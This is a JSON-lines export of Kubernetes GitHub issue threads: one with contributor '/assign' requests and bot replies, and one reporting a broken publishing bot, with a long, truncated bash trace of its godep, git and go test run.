[kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "vineetxkhurana", "body": "/assign\n"}, {"author": "k8s-ci-robot", "body": "@vineetxkhurana: GitHub didn't allow me to assign the following users: vineetxkhurana.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) with read permissions, repo collaborators and people who have commented on this issue/PR can be assigned. Additionally, issues/PRs can only have 10 assignees at the same time.\nFor more information please see [the contributor guide](https://git.k8s.io/community/contributors/guide/first-contribution.md#issue-assignment-in-github)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133185#issuecomment-3248070224):\n\n>/assign\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "DeepDN", "body": "/assign\n\n"}, {"author": "k8s-ci-robot", "body": "@DeepDN: GitHub didn't allow me to assign the following users: DeepDN.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) with read permissions, repo collaborators and people who have commented on this issue/PR can be assigned. Additionally, issues/PRs can only have 10 assignees at the same time.\nFor more information please see [the contributor guide](https://git.k8s.io/community/contributors/guide/first-contribution.md#issue-assignment-in-github)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133185#issuecomment-3289709597):\n\n>/assign\n>\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "vyual", "body": "Hi, can I work on this issue? I can fix tests also"}, {"author": "allwyn7", "body": "/assign"}, {"author": "k8s-ci-robot", "body": "@allwyn7: GitHub didn't allow me to assign the following users: allwyn7.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) with read permissions, repo collaborators and people who have commented on this issue/PR can be assigned. Additionally, issues/PRs can only have 10 assignees at the same time.\nFor more information please see [the contributor guide](https://git.k8s.io/community/contributors/guide/first-contribution.md#issue-assignment-in-github)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133185#issuecomment-3312542539):\n\n>/assign\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "LylaB", "body": "/assign"}, {"author": "k8s-ci-robot", "body": "@LylaB: GitHub didn't allow me to assign the following users: LylaB.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) with read permissions, repo collaborators and people who have commented on this issue/PR can be assigned. Additionally, issues/PRs can only have 10 assignees at the same time.\nFor more information please see [the contributor guide](https://git.k8s.io/community/contributors/guide/first-contribution.md#issue-assignment-in-github)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133185#issuecomment-3314879037):\n\n>/assign\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@uestcergs7: GitHub didn't allow me to assign the following users: uestcergs7.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) with read permissions, repo collaborators and people who have commented on this issue/PR can be assigned. Additionally, issues/PRs can only have 10 assignees at the same time.\nFor more information please see [the contributor guide](https://git.k8s.io/community/contributors/guide/first-contribution.md#issue-assignment-in-github)\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133185#issuecomment-3326737670):\n\n>/assign\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "uestcergs7", "body": "I'm willing to handle this."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 56876, "issue_url": "https://github.com/kubernetes/kubernetes/issues/56876", "issue_title": "kubernetes publishing bot is broken", "issue_author": "k8s-publishing-bot", "issue_body": "This issue is auto-updated by the k8s-publishing-bot when the (nightly) publishing process fails. Only the last log output is available.\r\n\r\nBot: [![](https://img.shields.io/uptimerobot/status/m779759348-04b1f4fd3bb5ce4a810670d2.svg)](https://stats.uptimerobot.com/wm4Dyt8kY) \u2014 Last publishing run: [![](https://img.shields.io/uptimerobot/status/m779759340-0a6b2cb6fee352e75f58ba16.svg)](https://stats.uptimerobot.com/wm4Dyt8kY)\r\n\r\n", "issue_labels": ["kind/bug", "priority/critical-urgent", "area/release-eng", "release-blocker", "sig/release", "sig/architecture", "triage/accepted"], "comments": [{"author": "dims", "body": "/reopen"}, {"author": "k8s-ci-robot", "body": "@dims: you can't re-open an issue/PR unless you authored it or you are assigned to it.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-376925524):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/devel/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-417815657):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>...it diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=c4528e9778198aa1f59e74dcfec43bcb5ce1c107\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\tFixing up godeps after a complete sync\n>\t+ local dst_merge_point_commit=c4528e9778198aa1f59e74dcfec43bcb5ce1c107\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' c4528e9778198aa1f59e74dcfec43bcb5ce1c107 '!=' c4528e9778198aa1f59e74dcfec43bcb5ce1c107 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.9,api:release-1.9 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.9,api:release-1.9\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=c4528e9778198aa1f59e74dcfec43bcb5ce1c107\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.9,api:release-1.9 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.9,api:release-1.9\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t\t+ Rfor de in '$../*'\n>\t+m '[' '!' -d '$../*' ']'\n>\t+ continueo\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>vi\tn++ basename /go-workspace/src/k8s.io/client-go\n>g k8s.io/* dependencies from Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>Running godep restore.\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.9,api:release-1.9\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=201616aac8cad1dff49ede91c783bc120d4e326b\n>\t+ '[' -z 201616aac8cad1dff49ede91c783bc120d4e326b ']'\n>\t++ git-find-merge 201616aac8cad1dff49ede91c783bc120d4e326b upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '201616aac8cad1dff49ede91c783bc120d4e326b^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 201616aac8cad1dff49ede91c783bc120d4e326b..upstream-branch --ancestry-path\n>\t+++ git rev-parse 201616aac8cad1dff49ede91c783bc120d4e326b\n>\t+ local k_last_kube_merge=201616aac8cad1dff49ede91c783bc120d4e326b\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.9\n>\t+ echo 'Looking up which commit in the release-1.9 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 201616aac8cad1dff49ede91c783bc120d4e326b.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.9 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 201616aac8cad1dff49ede91c783bc120d4e326b.\n>\t++ look -b 201616aac8cad1dff49ede91c783bc120d4e326b ../kube-commits-apimachinery-release-1.9\n>\t+ '[' -z fb40df2b502912cbe3a93aa61c2b2487f39cb42f ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to fb40df2b502912cbe3a93aa61c2b2487f39cb42f'\n>\t+ git checkout -q fb40df2b502912cbe3a93aa61c2b2487f39cb42f\n>\tChecking out k8s.io/apimachinery to fb40df2b502912cbe3a93aa61c2b2487f39cb42f\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.9\n>\t+ echo 'Looking up which commit in the release-1.9 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 201616aac8cad1dff49ede91c783bc120d4e326b.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.9 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 201616aac8cad1dff49ede91c783bc120d4e326b.\n>\t++ look -b 201616aac8cad1dff49ede91c783bc120d4e326b ../kube-commits-api-release-1.9\n>\t+ '[' -z 9273ee02527c608cecc74969b3e489f5dba686da ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 9273ee02527c608cecc74969b3e489f5dba686da'\n>\t+ git checkout -q 9273ee02527c608cecc74969b3e489f5dba686da\n>\tChecking out k8s.io/api to 9273ee02527c608cecc74969b3e489f5dba686da\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t\t+ ecRho 'Running godep save.'\n>\t+ godep save ./...\n>unning godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-6.0 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-6.0 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code c4528e9778198aa1f59e74dcfec43bcb5ce1c107\n>\t\tR+e echmo 'Remove redundant godep commits on-top of c4528e9778198aa1f59e74dcfec43bove reduncb5ce1c107.'\n>\t+ gdit reset --soft -q c4528e9778198aa1f59e74dcfec43bcb5ce1c107\n>ant godep commits on-top of c4528e9778198aa1f59e74dcfec43bcb5ce1c107.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/client-go\n>\t+ local repo=client-go\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'c4528e9 Merge pull request #66919 from sttts/sttts-client-go-scale-fix-2' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-6.0'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-6.0\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-6.0\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=c4528e9778198aa1f59e74dcfec43bcb5ce1c107\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-client-go-release-6.0.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-client-go-release-6.0.sh\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.9 --push-script ../push-tags-client-go-release-6.0.sh --dependencies apimachinery:release-1.9,api:release-1.9 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\tIgnoring already published tag kubernetes-1.9.7-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.1.\n>\tIgnoring already published tag kubernetes-1.9.0-beta.2.\n>\tIgnoring already published tag kubernetes-1.9.2.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.3.\n>\tIgnoring already published tag kubernetes-1.9.2-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.9.\n>\tIgnoring already published tag kubernetes-1.9.3-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.0-beta.1.\n>\tIgnoring already published tag kubernetes-1.10.0-alpha.0.\n>\tIgnoring already published tag kubernetes-1.9.9-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.6-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.2.\n>\tIgnoring already published tag kubernetes-1.9.10-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.8.\n>\tIgnoring already published tag kubernetes-1.9.10.\n>\tIgnoring already published tag kubernetes-1.9.0.\n>\tIgnoring already published tag kubernetes-1.9.3.\n>\tIgnoring already published tag kubernetes-1.9.5-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.11-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.4.\n>\tIgnoring already published tag kubernetes-1.9.0-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.7.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.0.\n>\tIgnoring already published tag kubernetes-1.9.0-alpha.1.\n>\tIgnoring already published tag kubernetes-1.9.1-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.6.\n>\tIgnoring already published tag kubernetes-1.9.8-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.4-beta.0.\n>\tIgnoring already published tag kubernetes-1.9.5.\n>\t++ git rev-parse release-6.0\n>\t+ '[' c4528e9778198aa1f59e74dcfec43bcb5ce1c107 '!=' c4528e9778198aa1f59e74dcfec43bcb5ce1c107 ']'\n>\t+ git checkout release-6.0\n>\tAlready on 'release-6.0'\n>\tYour branch is up-to-date with 'origin/release-6.0'.\n>[31 Aug 18 23:43 UTC]: Running smoke tests for branch release-6.0\n>[31 Aug 18 23:43 UTC]: /bin/bash -xec \"godep restore\\ngo build ./...\\ngo test $(go list ./... | grep -v /vendor/)\\n\"\n>\t+ godep restore\n>\t+ go build ./...\n>\t++ go list ./...\n>\t++ grep -v /vendor/\n>\t+ go test k8s.io/client-go/discovery k8s.io/client-go/discovery/cached k8s.io/client-go/discovery/fake k8s.io/client-go/dynamic k8s.io/client-go/dynamic/fake k8s.io/client-go/examples/create-update-delete-deployment k8s.io/client-go/examples/in-cluster-client-configuration k8s.io/client-go/examples/out-of-cluster-client-configuration k8s.io/client-go/examples/workqueue k8s.io/client-go/informers k8s.io/client-go/informers/admissionregistration k8s.io/client-go/informers/admissionregistration/v1alpha1 k8s.io/client-go/informers/admissionregistration/v1beta1 k8s.io/client-go/informers/apps k8s.io/client-go/informers/apps/v1 k8s.io/client-go/informers/apps/v1beta1 k8s.io/client-go/informers/apps/v1beta2 k8s.io/client-go/informers/autoscaling k8s.io/client-go/informers/autoscaling/v1 k8s.io/client-go/informers/autoscaling/v2beta1 k8s.io/client-go/informers/batch k8s.io/client-go/informers/batch/v1 k8s.io/client-go/informers/batch/v1beta1 k8s.io/client-go/informers/batch/v2alpha1 k8s.io/client-go/informers/certificates k8s.io/client-go/informers/certificates/v1beta1 k8s.io/client-go/informers/core k8s.io/client-go/informers/core/v1 k8s.io/client-go/informers/events k8s.io/client-go/informers/events/v1beta1 k8s.io/client-go/informers/extensions k8s.io/client-go/informers/extensions/v1beta1 k8s.io/client-go/informers/internalinterfaces k8s.io/client-go/informers/networking k8s.io/client-go/informers/networking/v1 k8s.io/client-go/informers/policy k8s.io/client-go/informers/policy/v1beta1 k8s.io/client-go/informers/rbac k8s.io/client-go/informers/rbac/v1 k8s.io/client-go/informers/rbac/v1alpha1 k8s.io/client-go/informers/rbac/v1beta1 k8s.io/client-go/informers/scheduling k8s.io/client-go/informers/scheduling/v1alpha1 k8s.io/client-go/informers/settings k8s.io/client-go/informers/settings/v1alpha1 k8s.io/client-go/informers/storage k8s.io/client-go/informers/storage/v1 k8s.io/client-go/informers/storage/v1alpha1 k8s.io/client-go/informers/storage/v1beta1 k8s.io/client-go/kubernetes k8s.io/client-go/kubernetes/fake k8s.io/client-go/kubernetes/scheme k8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1 k8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1/fake k8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1 k8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1/fake k8s.io/client-go/kubernetes/typed/apps/v1 k8s.io/client-go/kubernetes/typed/apps/v1/fake k8s.io/client-go/kubernetes/typed/apps/v1beta1 k8s.io/client-go/kubernetes/typed/apps/v1beta1/fake k8s.io/client-go/kubernetes/typed/apps/v1beta2 k8s.io/client-go/kubernetes/typed/apps/v1beta2/fake k8s.io/client-go/kubernetes/typed/authentication/v1 k8s.io/client-go/kubernetes/typed/authentication/v1/fake k8s.io/client-go/kubernetes/typed/authentication/v1beta1 k8s.io/client-go/kubernetes/typed/authentication/v1beta1/fake k8s.io/client-go/kubernetes/typed/authorization/v1 k8s.io/client-go/kubernetes/typed/authorization/v1/fake k8s.io/client-go/kubernetes/typed/authorization/v1beta1 k8s.io/client-go/kubernetes/typed/authorization/v1beta1/fake k8s.io/client-go/kubernetes/typed/autoscaling/v1 k8s.io/client-go/kubernetes/typed/autoscaling/v1/fake k8s.io/client-go/kubernetes/typed/autoscaling/v2beta1 k8s.io/client-go/kubernetes/typed/autoscaling/v2beta1/fake k8s.io/client-go/kubernetes/typed/batch/v1 k8s.io/client-go/kubernetes/typed/batch/v1/fake k8s.io/client-go/kubernetes/typed/batch/v1beta1 k8s.io/client-go/kubernetes/typed/batch/v1beta1/fake k8s.io/client-go/kubernetes/typed/batch/v2alpha1 k8s.io/client-go/kubernetes/typed/batch/v2alpha1/fake k8s.io/client-go/kubernetes/typed/certificates/v1beta1 k8s.io/client-go/kubernetes/typed/certificates/v1beta1/fake k8s.io/client-go/kubernetes/typed/core/v1 k8s.io/client-go/kubernetes/typed/core/v1/fake k8s.io/client-go/kubernetes/typed/events/v1beta1 k8s.io/client-go/kubernetes/typed/events/v1beta1/fake k8s.io/client-go/kubernetes/typed/extensions/v1beta1 k8s.io/client-go/kubernetes/typed/extensions/v1beta1/fake k8s.io/client-go/kubernetes/typed/networking/v1 k8s.io/client-go/kubernetes/typed/networking/v1/fake k8s.io/client-go/kubernetes/typed/policy/v1beta1 k8s.io/client-go/kubernetes/typed/policy/v1beta1/fake k8s.io/client-go/kubernetes/typed/rbac/v1 k8s.io/client-go/kubernetes/typed/rbac/v1/fake k8s.io/client-go/kubernetes/typed/rbac/v1alpha1 k8s.io/client-go/kubernetes/typed/rbac/v1alpha1/fake k8s.io/client-go/kubernetes/typed/rbac/v1beta1 k8s.io/client-go/kubernetes/typed/rbac/v1beta1/fake k8s.io/client-go/kubernetes/typed/scheduling/v1alpha1 k8s.io/client-go/kubernetes/typed/scheduling/v1alpha1/fake k8s.io/client-go/kubernetes/typed/settings/v1alpha1 k8s.io/client-go/kubernetes/typed/settings/v1alpha1/fake k8s.io/client-go/kubernetes/typed/storage/v1 k8s.io/client-go/kubernetes/typed/storage/v1/fake k8s.io/client-go/kubernetes/typed/storage/v1alpha1 k8s.io/client-go/kubernetes/typed/storage/v1alpha1/fake k8s.io/client-go/kubernetes/typed/storage/v1beta1 k8s.io/client-go/kubernetes/typed/storage/v1beta1/fake k8s.io/client-go/listers/admissionregistration/v1alpha1 k8s.io/client-go/listers/admissionregistration/v1beta1 k8s.io/client-go/listers/apps/v1 k8s.io/client-go/listers/apps/v1beta1 k8s.io/client-go/listers/apps/v1beta2 k8s.io/client-go/listers/authentication/v1 k8s.io/client-go/listers/authentication/v1beta1 k8s.io/client-go/listers/authorization/v1 k8s.io/client-go/listers/authorization/v1beta1 k8s.io/client-go/listers/autoscaling/v1 k8s.io/client-go/listers/autoscaling/v2beta1 k8s.io/client-go/listers/batch/v1 k8s.io/client-go/listers/batch/v1beta1 k8s.io/client-go/listers/batch/v2alpha1 k8s.io/client-go/listers/certificates/v1beta1 k8s.io/client-go/listers/core/v1 k8s.io/client-go/listers/events/v1beta1 k8s.io/client-go/listers/extensions/v1beta1 k8s.io/client-go/listers/imagepolicy/v1alpha1 k8s.io/client-go/listers/networking/v1 k8s.io/client-go/listers/policy/v1beta1 k8s.io/client-go/listers/rbac/v1 k8s.io/client-go/listers/rbac/v1alpha1 k8s.io/client-go/listers/rbac/v1beta1 k8s.io/client-go/listers/scheduling/v1alpha1 k8s.io/client-go/listers/settings/v1alpha1 k8s.io/client-go/listers/storage/v1 k8s.io/client-go/listers/storage/v1alpha1 k8s.io/client-go/listers/storage/v1beta1 k8s.io/client-go/pkg/version k8s.io/client-go/plugin/pkg/auth/authenticator/token/oidc/testing k8s.io/client-go/plugin/pkg/client/auth k8s.io/client-go/plugin/pkg/client/auth/azure k8s.io/client-go/plugin/pkg/client/auth/gcp k8s.io/client-go/plugin/pkg/client/auth/oidc k8s.io/client-go/plugin/pkg/client/auth/openstack k8s.io/client-go/rest k8s.io/client-go/rest/fake k8s.io/client-go/rest/watch k8s.io/client-go/scale k8s.io/client-go/scale/fake k8s.io/client-go/scale/scheme k8s.io/client-go/scale/scheme/appsint k8s.io/client-go/scale/scheme/appsv1beta1 k8s.io/client-go/scale/scheme/appsv1beta2 k8s.io/client-go/scale/scheme/autoscalingv1 k8s.io/client-go/scale/scheme/extensionsint k8s.io/client-go/scale/scheme/extensionsv1beta1 k8s.io/client-go/testing k8s.io/client-go/third_party/forked/golang/template k8s.io/client-go/tools/auth k8s.io/client-go/tools/cache k8s.io/client-go/tools/cache/testing k8s.io/client-go/tools/clientcmd k8s.io/client-go/tools/clientcmd/api k8s.io/client-go/tools/clientcmd/api/latest k8s.io/client-go/tools/clientcmd/api/v1 k8s.io/client-go/tools/leaderelection k8s.io/client-go/tools/leaderelection/resourcelock k8s.io/client-go/tools/metrics k8s.io/client-go/tools/pager k8s.io/client-go/tools/portforward k8s.io/client-go/tools/record k8s.io/client-go/tools/reference k8s.io/client-go/tools/remotecommand k8s.io/client-go/transport k8s.io/client-go/transport/spdy k8s.io/client-go/util/buffer k8s.io/client-go/util/cert k8s.io/client-go/util/cert/triple k8s.io/client-go/util/certificate k8s.io/client-go/util/certificate/csr k8s.io/client-go/util/exec k8s.io/client-go/util/flowcontrol k8s.io/client-go/util/homedir k8s.io/client-go/util/integer k8s.io/client-go/util/jsonpath k8s.io/client-go/util/retry k8s.io/client-go/util/testing k8s.io/client-go/util/workqueue\n>\tok  \tk8s.io/client-go/discovery\t0.594s\n>\tok  \tk8s.io/client-go/discovery/cached\t0.500s\n>\tok  \tk8s.io/client-go/discovery/fake\t0.496s\n>\tok  \tk8s.io/client-go/dynamic\t0.603s\n>\t?   \tk8s.io/client-go/dynamic/fake\t[no test files]\n>\t?   \tk8s.io/client-go/examples/create-update-delete-deployment\t[no test files]\n>\t?   \tk8s.io/client-go/examples/in-cluster-client-configuration\t[no test files]\n>\t?   \tk8s.io/client-go/examples/out-of-cluster-client-configuration\t[no test files]\n>\t?   \tk8s.io/client-go/examples/workqueue\t[no test files]\n>\t?   \tk8s.io/client-go/informers\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/batch/v2alpha1\t[no test files]\n>\t?   